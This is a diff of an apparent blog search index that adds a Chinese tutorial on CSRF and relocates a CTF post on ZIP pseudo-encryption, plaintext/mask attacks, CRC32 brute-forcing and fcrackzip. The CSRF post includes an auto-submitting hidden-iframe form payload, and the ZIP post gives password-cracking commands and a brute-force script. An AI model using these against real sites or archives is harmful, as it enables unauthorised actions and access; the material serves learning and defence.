@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CSRF 简单认识</title>
+      <link href="/2019/12/22/CSRF-%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
+      <url>/2019/12/22/CSRF-%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CSRF-简单认识"><a href="#CSRF-简单认识" class="headerlink" title="CSRF 简单认识"></a>CSRF 简单认识</h1><p>12/22/2019 11:47:20 AM </p><h2 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h2><p>跨站请求伪造-Cross Site Request Forgery，也被称作XSRF，简单来说就是 攻击者在不知道某个账户账号密码的情况下，利用目标站点已经登陆过的账户产生的身份凭证信息(cookie)来进行一系列操作，同时该站点认为攻击者所采取的动作都是合法的(因为攻击者盗用了认证通过的账户账号信息)。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果对于某个网站的删除文章功能的代码是 </p><pre><code>&lt;a href=&apos;/delete?id=3&apos;&gt;刪除&lt;/a&gt;</code></pre><p>然后在后端做校验，验证 requests 有没有带 session_id ,同时确认是不是这个文章的作者。此时，假如攻击者通过钓鱼，创建了一个有针对性的网页，里面的按钮的代码是：</p><pre><code>&lt;a href=&apos;https://small-min.blog.com/delete?id=3&apos;&gt;開始測驗&lt;/a&gt;</code></pre><p>如果这时文章作者点击了按钮，那么由于浏览器的跨域请求机制(在浏览器进程的生命周期内，即使浏览器打开了新的Tab页，Session Cookie 也是有效的。Session Cookie 保存在浏览器内存空间内)会把作者的cookie一起带到GET请求中，服务端检查到确实是作者，于是文章被删除了。</p><p>如果禁用了 <code>&lt;img&gt; 、 &lt;iframe&gt; 、 &lt;script&gt;</code> 等带 src 属性的标签，就可以禁止 CSRF 了？这类标签只能发起一次 GET 请求，而不能发起 POST 请求。但是 <code>form</code> 标签可以发送 POST request.</p><pre><code>&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;  &lt;input type=&quot;submit&quot; value=&quot;開始測驗&quot;/&gt;&lt;/form&gt;</code></pre><p>这样还是显式的，我们可以采用更隐蔽的方式</p><pre><code>&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;&lt;form method=&apos;POST&apos; action=&apos;https://small-min.blog.com/delete&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;  &lt;input type=&apos;hidden&apos; name=&apos;id&apos; value=&apos;3&apos;&gt;  &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</code></pre><p>还可以使用 burp 自带的 generate CSRF poc,选择测试 URL 右键选择生成 CSRF poc,将要替换的值然后保存访问即可。</p><p>还可以使用 CSRFTester 软件来测试</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><ol><li>GET</li></ol><p>如果带有 token 等验证参数，先去掉参数尝试能否正常请求，如果可以即存在 CSRF 漏洞。</p><ol start="2"><li>POST</li></ol><p>最简单的方法就是抓取一个正常请求的数据包，去掉 token 等验证参数后提交，如果正常访问，再去掉 Referer 后重新提交，如果提交还有效，那么基本可以认为存在 CSRF 漏洞，可以构造外部 form 表单来进行提交。如果去掉 referer 失败还可以验证对 referer 校验是否严格尝试绕过。也可能存在代码对请求类型判断不严格($_REQUEST[])，如果 post 失败了尝试改成 get 进行请求。 </p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>强制用户必须与应用完成交互，避免在不知情的情况下构造网络请求</p><h3 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h3><p>检查请求是否来自合法的源，但是不足之处在于浏览器并非什么时候都能取到Referer.</p><h3 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h3><p>将参数加密，或者使用一些真随机数，让攻击者无法猜测到参数值，达到“不可预测性原则”。可以新加一个参数 TOKEN ，同时放在表单和 session 中，服务端只需验证表单中的 TOKEN 和 session 中的 Token 是否一致，一致则认为是合法请求。 </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CSRF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>java</title>
       <link href="/2019/11/26/java-tests/"/>
       <url>/2019/11/26/java-tests/</url>
@@ -70,9 +95,9 @@
       
         <tags>
             
-            <tag> wp </tag>
-            
             <tag> ctf </tag>
+            
+            <tag> wp </tag>
             
         </tags>
       
@@ -272,9 +297,9 @@
       
         <tags>
             
-            <tag> RSA </tag>
-            
             <tag> SSTI </tag>
+            
+            <tag> RSA </tag>
             
         </tags>
       
@@ -453,9 +478,9 @@
       
         <tags>
             
-            <tag> RSA </tag>
-            
             <tag> ssrf </tag>
+            
+            <tag> RSA </tag>
             
         </tags>
       
@@ -480,9 +505,9 @@
       
         <tags>
             
-            <tag> ssrf </tag>
-            
             <tag> redis </tag>
+            
+            <tag> ssrf </tag>
             
         </tags>
       
@@ -507,9 +532,9 @@
       
         <tags>
             
-            <tag> ssrf </tag>
-            
             <tag> redis </tag>
+            
+            <tag> ssrf </tag>
             
         </tags>
       
@@ -640,9 +665,9 @@
       
         <tags>
             
-            <tag> serialize </tag>
-            
             <tag> php </tag>
+            
+            <tag> serialize </tag>
             
         </tags>
       
@@ -703,6 +728,33 @@
     
     
     <entry>
+      <title>ZIP&#39;s things</title>
+      <link href="/2019/03/23/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
+      <url>/2019/03/23/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
+      
+        <content type="html"><![CDATA[<p>只要我E的够快，寂寞就追不上我！</p><p>对不起，走错片场了~😄</p><a id="more"></a><p>##0x01 zip文件组成 ##</p><p><strong>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</strong></p><h3 id="1-压缩源文件数据区"><a href="#1-压缩源文件数据区" class="headerlink" title="1 压缩源文件数据区"></a>1 压缩源文件数据区</h3><p>在这个数据区中每个压缩文件的源文件/目录都是一条记录，记录格式如下[文件头+文件数据+数据描述符]</p><h4 id="文件头结构"><a href="#文件头结构" class="headerlink" title="文件头结构"></a>文件头结构</h4><hr><pre><code>      组成    　                长度  文件头标记                  4 bytes  (0x04034b50)  解压文件所需 pkware 版本    2 bytes 全局方式位标记              2 bytes压缩方式                    2 bytes最后修改文件时间             2 bytes最后修改文件日期             2 bytesCRC-32校验                  4 bytes压缩后尺寸                  4 bytes未压缩尺寸                  4 bytes文件名长度                  2 bytes  扩展记录长度                2 bytes文件名                     （不定长度）扩展字段                   （不定长度）</code></pre><h4 id="文件数据"><a href="#文件数据" class="headerlink" title="文件数据"></a>文件数据</h4><p>就是数据</p><h4 id="数据描述符"><a href="#数据描述符" class="headerlink" title="数据描述符"></a>数据描述符</h4><hr><pre><code> 　　　组成    　长度CRC-32校验                  4 bytes压缩后尺寸                   4 bytes未压缩尺寸                   4 bytes</code></pre><p>这个数据描述符只在全局方式位标记的第三位设为1时才存在，紧接在压缩数据的最后一个字节后。</p><h3 id="2-压缩源文件目录区"><a href="#2-压缩源文件目录区" class="headerlink" title="2.压缩源文件目录区"></a>2.压缩源文件目录区</h3><p>在这个数据区中每一条记录对应在压缩源文件区中的一条数据</p><hr><pre><code>   　　　组成               　            长度　　目录中文件文件头标记             4 bytes  (0x02014b50)　　压缩使用的　pkware 版本          2 bytes　　解压文件所需 pkware 版本         2 bytes　　全局方式位标记                   2 bytes　　压缩方式                        2 bytes　　最后修改文件时间                 2 bytes　　最后修改文件日期                 2 bytes　　ＣＲＣ－３２校验                 4 bytes　　压缩后尺寸                      4 bytes　　未压缩尺寸                      4 bytes　　文件名长度                      2 bytes　　扩展字段长度                    2 bytes　　文件注释长度                    2 bytes　　磁盘开始号                      2 bytes　　内部文件属性                    2 bytes　　外部文件属性                    4 bytes局部头部偏移量                  4 bytes　　文件名                       （不定长度）　　扩展字段                     （不定长度）文件注释                     （不定长度）</code></pre><h3 id="3-压缩源文件目录结束标志"><a href="#3-压缩源文件目录结束标志" class="headerlink" title="3.压缩源文件目录结束标志"></a>3.压缩源文件目录结束标志</h3><hr><pre><code>　　　组成               　          长度目录结束标记                    4 bytes  (0x02014b50)当前磁盘编号                    2 bytes目录区开始磁盘编号              2 bytes　　本磁盘上纪录总数                 2 bytes　　目录区中纪录总数                 2 bytes　　目录区尺寸大小                   4 bytes　　目录区对第一张磁盘的偏移量        4 bytes　　ZIP 文件注释长度                 2 bytes　　ZIP 文件注释                   （不定长度）</code></pre><p>这里可以注意到文件目录结束标志只有22位，如果超出这部分则可能是隐藏数据(今天真的是被桂电的MISC给虐哭了/(ㄒoㄒ)/~~)。</p><h2 id="0x02-ZIP伪加密"><a href="#0x02-ZIP伪加密" class="headerlink" title="0x02 ZIP伪加密"></a>0x02 ZIP伪加密</h2><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kazyuumnj30gx0de41x.jpg" alt></p><p>压缩源文件数据区–头文件标志：50 4B 03 04</p><p>压缩源文件目录区：</p><ul><li>目录中文件文件头标志：50 4B 01 02</li><li>压缩使用的pkware:     3F 00</li><li>紧跟着是解压文件所需要的pkware版本：14 00</li><li>全局方式位标记：00 00(更改这里进行伪加密，改为09 00就会提示有密码，实际上只要是以奇数结尾即可)</li></ul><p>压缩源文件目录结束标志：50 4B 05 06</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kb023lp3j30gx0d4jug.jpg" alt></p><p>如何判断伪加密？</p><p>无加密</p><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00</p><p>假加密</p><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><p>真加密</p><p>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><h2 id="0x03-ZIP明文攻击"><a href="#0x03-ZIP明文攻击" class="headerlink" title="0x03 ZIP明文攻击"></a>0x03 ZIP明文攻击</h2><p>如果一个压缩包你不知道密码，但是压缩包里有一个已知文件（文件大小大于12Byte），因为同一个压缩包里的文件都是采用同一个密钥加密，所以可以用已知文件来找密钥。</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kb052ll8j30g70fhwhx.jpg" alt></p><h2 id="0x03-ZIP掩码攻击"><a href="#0x03-ZIP掩码攻击" class="headerlink" title="0x03 ZIP掩码攻击"></a>0x03 ZIP掩码攻击</h2><p>已知密码的某几位进行构造，这里以桂电的MISC为例，前面我们已经解开两层加密，得到了最后的111.zip,<br>里面有</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kb0bwn1ej305b02bt8i.jpg" alt></p><p>打开.sh文件是这样的内容</p><pre><code>#!/bin/bash#zip -e --password=`python -c &quot;print(__import__(&apos;time&apos;).time())&quot;` flag.zip flag</code></pre><p>跑一下命令</p><pre><code>&gt;&gt;&gt; print(__import__(&apos;time&apos;).time())1558685006.11</code></pre><p>大概形式知道了尝试掩码攻击</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kb0ltqooj30fh0f0gp8.jpg" alt></p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kb0oiik6j30f206d0tr.jpg" alt></p><h2 id="0x04-CRC32碰撞"><a href="#0x04-CRC32碰撞" class="headerlink" title="0x04 CRC32碰撞"></a>0x04 CRC32碰撞</h2><p>CRC本身是循环冗余校验码的意思，CRC32则表示产生一个32bit（8位十六进制数）的校验值</p><p>在生成该校验值的时候源数据每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容。<br>这里做测试用我们创建了一个内容只有‘1234’的txt文件并进行压缩，得到压缩的CRC值，写脚本进行爆破</p><pre><code>import binasciicrc=0x9BE3E0A3for i in range(1000,9999+1):if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc:    print i</code></pre><p>由于内容较短几秒就碰撞出文件内容。</p><p>在PY2.x版本中。binascii.crc32中所计算出的CRC值域为[-2^31,2^31-1]之间的有符号整数，为了与一般的CRC结果对比，需要将其转换为无符号整数，所以加上 &amp; 0xfffffffff来进行转换</p><pre><code>&gt;&gt;&gt; str1=0x4D2&gt;&gt;&gt; str2=str1 &amp; 0xffff&gt;&gt;&gt; print str21234</code></pre><p>如果是py3.x版本计算结果为无符号整数，就不用加了。 </p><h2 id="0x05-其他乱七八糟的"><a href="#0x05-其他乱七八糟的" class="headerlink" title="0x05 其他乱七八糟的"></a>0x05 其他乱七八糟的</h2><h3 id="关于fcrackzip"><a href="#关于fcrackzip" class="headerlink" title="关于fcrackzip"></a>关于fcrackzip</h3><p>作为kali自带的工具，可以使用它来进行爆破工作，这里还是用桂电的MISC-222.zip为例</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kb0955f3j30ls0fndvz.jpg" alt></p><p>由菜单可知-b 是爆破，-c 指定字符集,-l指定长度,-u 用解压的方式淘汰掉错误的密码。当然我们也可以跑字典</p><pre><code># fcrackzip -D -p /字典位置/xxx.txt  -u crack_this.zip</code></pre><h3 id="关于图片格式问题"><a href="#关于图片格式问题" class="headerlink" title="关于图片格式问题"></a>关于图片格式问题</h3><p>png文件署名域</p><ul><li>十进制数：137 80 78 71 13 10 26 10</li><li>十六进制：89 50 4e 47 0d 0a 1a 0a</li></ul><h3 id="文件头总结"><a href="#文件头总结" class="headerlink" title="文件头总结"></a>文件头总结</h3><pre><code>JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　PNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82GIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4BTIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：Windows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：CAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：Adobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：HTML (html)，                           文件头：68746D6C3EEmail [thorough only] (eml)，     文件头：44656C69766572792D646174653AOutlook Express (dbx)，            文件头：CFAD12FEC5FD746FOutlook (pst)，                         文件头：2142444EMS Word/Excel (xls.or.doc)，      文件头：D0CF11E0MS Access (mdb)，                    文件头：5374616E64617264204AWordPerfect (wpd)，                  文件头：FF575043Adobe Acrobat (pdf)，               文件头：255044462D312EQuicken (qdf)，                         文件头：AC9EBD8FWindows Password (pwl)，         文件头：E3828596RAR Archive (rar)，                    文件头：52617221Wave (wav)，                            文件头：57415645AVI (avi)，                                 文件头：41564920Real Audio (ram)，                     文件头：2E7261FDReal Media (rm)，                       文件头：2E524D46MPEG (mpg)，                           文件头：000001BAMPEG (mpg)，                           文件头：000001B3Quicktime (mov)，                     文件头：6D6F6F76Windows Media (asf)，               文件头：3026B2758E66CF11MIDI (mid)，                              文件头：4D546864</code></pre><h3 id="zip文件格式"><a href="#zip文件格式" class="headerlink" title="zip文件格式"></a>zip文件格式</h3><p>翻译作者的文章链接<br><a href="https://blog.csdn.net/luoye7422/article/details/41878969" target="_blank" rel="noopener">https://blog.csdn.net/luoye7422/article/details/41878969</a></p><p>参考链接</p><blockquote><p><a href="https://www.jianshu.com/p/4d8cace82028" title="图片格式详解" target="_blank" rel="noopener">https://www.jianshu.com/p/4d8cace82028</a><br>更详细解释：<a href="https://blog.csdn.net/u012611878/article/details/52215985" target="_blank" rel="noopener">https://blog.csdn.net/u012611878/article/details/52215985</a><br><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865" target="_blank" rel="noopener">https://blog.csdn.net/xiangshangbashaonian/article/details/80156865</a></p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> zip </tag>
+            
+            <tag> misc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>命令执行漏洞(Command Execution)</title>
       <link href="/2019/03/23/Command-Execution/"/>
       <url>/2019/03/23/Command-Execution/</url>
@@ -746,36 +798,9 @@
       
         <tags>
             
-            <tag> serialize </tag>
-            
             <tag> php </tag>
             
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>ZIP&#39;s things</title>
-      <link href="/2019/03/23/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
-      <url>/2019/03/23/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
-      
-        <content type="html"><![CDATA[<p>只要我E的够快，寂寞就追不上我！</p><p>对不起，走错片场了~😄</p><a id="more"></a><p>##0x01 zip文件组成 ##</p><p><strong>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</strong></p><h3 id="1-压缩源文件数据区"><a href="#1-压缩源文件数据区" class="headerlink" title="1 压缩源文件数据区"></a>1 压缩源文件数据区</h3><p>在这个数据区中每个压缩文件的源文件/目录都是一条记录，记录格式如下[文件头+文件数据+数据描述符]</p><h4 id="文件头结构"><a href="#文件头结构" class="headerlink" title="文件头结构"></a>文件头结构</h4><hr><pre><code>      组成    　                长度  文件头标记                  4 bytes  (0x04034b50)  解压文件所需 pkware 版本    2 bytes 全局方式位标记              2 bytes压缩方式                    2 bytes最后修改文件时间             2 bytes最后修改文件日期             2 bytesCRC-32校验                  4 bytes压缩后尺寸                  4 bytes未压缩尺寸                  4 bytes文件名长度                  2 bytes  扩展记录长度                2 bytes文件名                     （不定长度）扩展字段                   （不定长度）</code></pre><h4 id="文件数据"><a href="#文件数据" class="headerlink" title="文件数据"></a>文件数据</h4><p>就是数据</p><h4 id="数据描述符"><a href="#数据描述符" class="headerlink" title="数据描述符"></a>数据描述符</h4><hr><pre><code> 　　　组成    　长度CRC-32校验                  4 bytes压缩后尺寸                   4 bytes未压缩尺寸                   4 bytes</code></pre><p>这个数据描述符只在全局方式位标记的第三位设为1时才存在，紧接在压缩数据的最后一个字节后。</p><h3 id="2-压缩源文件目录区"><a href="#2-压缩源文件目录区" class="headerlink" title="2.压缩源文件目录区"></a>2.压缩源文件目录区</h3><p>在这个数据区中每一条记录对应在压缩源文件区中的一条数据</p><hr><pre><code>   　　　组成               　            长度　　目录中文件文件头标记             4 bytes  (0x02014b50)　　压缩使用的　pkware 版本          2 bytes　　解压文件所需 pkware 版本         2 bytes　　全局方式位标记                   2 bytes　　压缩方式                        2 bytes　　最后修改文件时间                 2 bytes　　最后修改文件日期                 2 bytes　　ＣＲＣ－３２校验                 4 bytes　　压缩后尺寸                      4 bytes　　未压缩尺寸                      4 bytes　　文件名长度                      2 bytes　　扩展字段长度                    2 bytes　　文件注释长度                    2 bytes　　磁盘开始号                      2 bytes　　内部文件属性                    2 bytes　　外部文件属性                    4 bytes局部头部偏移量                  4 bytes　　文件名                       （不定长度）　　扩展字段                     （不定长度）文件注释                     （不定长度）</code></pre><h3 id="3-压缩源文件目录结束标志"><a href="#3-压缩源文件目录结束标志" class="headerlink" title="3.压缩源文件目录结束标志"></a>3.压缩源文件目录结束标志</h3><hr><pre><code>　　　组成               　          长度目录结束标记                    4 bytes  (0x02014b50)当前磁盘编号                    2 bytes目录区开始磁盘编号              2 bytes　　本磁盘上纪录总数                 2 bytes　　目录区中纪录总数                 2 bytes　　目录区尺寸大小                   4 bytes　　目录区对第一张磁盘的偏移量        4 bytes　　ZIP 文件注释长度                 2 bytes　　ZIP 文件注释                   （不定长度）</code></pre><p>这里可以注意到文件目录结束标志只有22位，如果超出这部分则可能是隐藏数据(今天真的是被桂电的MISC给虐哭了/(ㄒoㄒ)/~~)。</p><h2 id="0x02-ZIP伪加密"><a href="#0x02-ZIP伪加密" class="headerlink" title="0x02 ZIP伪加密"></a>0x02 ZIP伪加密</h2><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kazyuumnj30gx0de41x.jpg" alt></p><p>压缩源文件数据区–头文件标志：50 4B 03 04</p><p>压缩源文件目录区：</p><ul><li>目录中文件文件头标志：50 4B 01 02</li><li>压缩使用的pkware:     3F 00</li><li>紧跟着是解压文件所需要的pkware版本：14 00</li><li>全局方式位标记：00 00(更改这里进行伪加密，改为09 00就会提示有密码，实际上只要是以奇数结尾即可)</li></ul><p>压缩源文件目录结束标志：50 4B 05 06</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kb023lp3j30gx0d4jug.jpg" alt></p><p>如何判断伪加密？</p><p>无加密</p><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00</p><p>假加密</p><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><p>真加密</p><p>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><h2 id="0x03-ZIP明文攻击"><a href="#0x03-ZIP明文攻击" class="headerlink" title="0x03 ZIP明文攻击"></a>0x03 ZIP明文攻击</h2><p>如果一个压缩包你不知道密码，但是压缩包里有一个已知文件（文件大小大于12Byte），因为同一个压缩包里的文件都是采用同一个密钥加密，所以可以用已知文件来找密钥。</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kb052ll8j30g70fhwhx.jpg" alt></p><h2 id="0x03-ZIP掩码攻击"><a href="#0x03-ZIP掩码攻击" class="headerlink" title="0x03 ZIP掩码攻击"></a>0x03 ZIP掩码攻击</h2><p>已知密码的某几位进行构造，这里以桂电的MISC为例，前面我们已经解开两层加密，得到了最后的111.zip,<br>里面有</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kb0bwn1ej305b02bt8i.jpg" alt></p><p>打开.sh文件是这样的内容</p><pre><code>#!/bin/bash#zip -e --password=`python -c &quot;print(__import__(&apos;time&apos;).time())&quot;` flag.zip flag</code></pre><p>跑一下命令</p><pre><code>&gt;&gt;&gt; print(__import__(&apos;time&apos;).time())1558685006.11</code></pre><p>大概形式知道了尝试掩码攻击</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kb0ltqooj30fh0f0gp8.jpg" alt></p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kb0oiik6j30f206d0tr.jpg" alt></p><h2 id="0x04-CRC32碰撞"><a href="#0x04-CRC32碰撞" class="headerlink" title="0x04 CRC32碰撞"></a>0x04 CRC32碰撞</h2><p>CRC本身是循环冗余校验码的意思，CRC32则表示产生一个32bit（8位十六进制数）的校验值</p><p>在生成该校验值的时候源数据每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容。<br>这里做测试用我们创建了一个内容只有‘1234’的txt文件并进行压缩，得到压缩的CRC值，写脚本进行爆破</p><pre><code>import binasciicrc=0x9BE3E0A3for i in range(1000,9999+1):if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc:    print i</code></pre><p>由于内容较短几秒就碰撞出文件内容。</p><p>在PY2.x版本中。binascii.crc32中所计算出的CRC值域为[-2^31,2^31-1]之间的有符号整数，为了与一般的CRC结果对比，需要将其转换为无符号整数，所以加上 &amp; 0xfffffffff来进行转换</p><pre><code>&gt;&gt;&gt; str1=0x4D2&gt;&gt;&gt; str2=str1 &amp; 0xffff&gt;&gt;&gt; print str21234</code></pre><p>如果是py3.x版本计算结果为无符号整数，就不用加了。 </p><h2 id="0x05-其他乱七八糟的"><a href="#0x05-其他乱七八糟的" class="headerlink" title="0x05 其他乱七八糟的"></a>0x05 其他乱七八糟的</h2><h3 id="关于fcrackzip"><a href="#关于fcrackzip" class="headerlink" title="关于fcrackzip"></a>关于fcrackzip</h3><p>作为kali自带的工具，可以使用它来进行爆破工作，这里还是用桂电的MISC-222.zip为例</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kb0955f3j30ls0fndvz.jpg" alt></p><p>由菜单可知-b 是爆破，-c 指定字符集,-l指定长度,-u 用解压的方式淘汰掉错误的密码。当然我们也可以跑字典</p><pre><code># fcrackzip -D -p /字典位置/xxx.txt  -u crack_this.zip</code></pre><h3 id="关于图片格式问题"><a href="#关于图片格式问题" class="headerlink" title="关于图片格式问题"></a>关于图片格式问题</h3><p>png文件署名域</p><ul><li>十进制数：137 80 78 71 13 10 26 10</li><li>十六进制：89 50 4e 47 0d 0a 1a 0a</li></ul><h3 id="文件头总结"><a href="#文件头总结" class="headerlink" title="文件头总结"></a>文件头总结</h3><pre><code>JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　PNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82GIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4BTIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：Windows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：CAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：Adobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：HTML (html)，                           文件头：68746D6C3EEmail [thorough only] (eml)，     文件头：44656C69766572792D646174653AOutlook Express (dbx)，            文件头：CFAD12FEC5FD746FOutlook (pst)，                         文件头：2142444EMS Word/Excel (xls.or.doc)，      文件头：D0CF11E0MS Access (mdb)，                    文件头：5374616E64617264204AWordPerfect (wpd)，                  文件头：FF575043Adobe Acrobat (pdf)，               文件头：255044462D312EQuicken (qdf)，                         文件头：AC9EBD8FWindows Password (pwl)，         文件头：E3828596RAR Archive (rar)，                    文件头：52617221Wave (wav)，                            文件头：57415645AVI (avi)，                                 文件头：41564920Real Audio (ram)，                     文件头：2E7261FDReal Media (rm)，                       文件头：2E524D46MPEG (mpg)，                           文件头：000001BAMPEG (mpg)，                           文件头：000001B3Quicktime (mov)，                     文件头：6D6F6F76Windows Media (asf)，               文件头：3026B2758E66CF11MIDI (mid)，                              文件头：4D546864</code></pre><h3 id="zip文件格式"><a href="#zip文件格式" class="headerlink" title="zip文件格式"></a>zip文件格式</h3><p>翻译作者的文章链接<br><a href="https://blog.csdn.net/luoye7422/article/details/41878969" target="_blank" rel="noopener">https://blog.csdn.net/luoye7422/article/details/41878969</a></p><p>参考链接</p><blockquote><p><a href="https://www.jianshu.com/p/4d8cace82028" title="图片格式详解" target="_blank" rel="noopener">https://www.jianshu.com/p/4d8cace82028</a><br>更详细解释：<a href="https://blog.csdn.net/u012611878/article/details/52215985" target="_blank" rel="noopener">https://blog.csdn.net/u012611878/article/details/52215985</a><br><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865" target="_blank" rel="noopener">https://blog.csdn.net/xiangshangbashaonian/article/details/80156865</a></p></blockquote>]]></content>
-      
-      
-      <categories>
-          
-          <category> ctf </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> zip </tag>
-            
-            <tag> misc </tag>
+            <tag> serialize </tag>
             
         </tags>
       
@@ -834,27 +859,23 @@
     
     
     <entry>
-      <title>LSB图片隐写</title>
-      <link href="/2018/03/23/LSB%E9%9A%90%E5%86%99/"/>
-      <url>/2018/03/23/LSB%E9%9A%90%E5%86%99/</url>
+      <title>CSAW CTF 2016 mfw Writeup</title>
+      <link href="/2018/03/23/CSAW-CTF-2016-mfw-Writeup/"/>
+      <url>/2018/03/23/CSAW-CTF-2016-mfw-Writeup/</url>
       
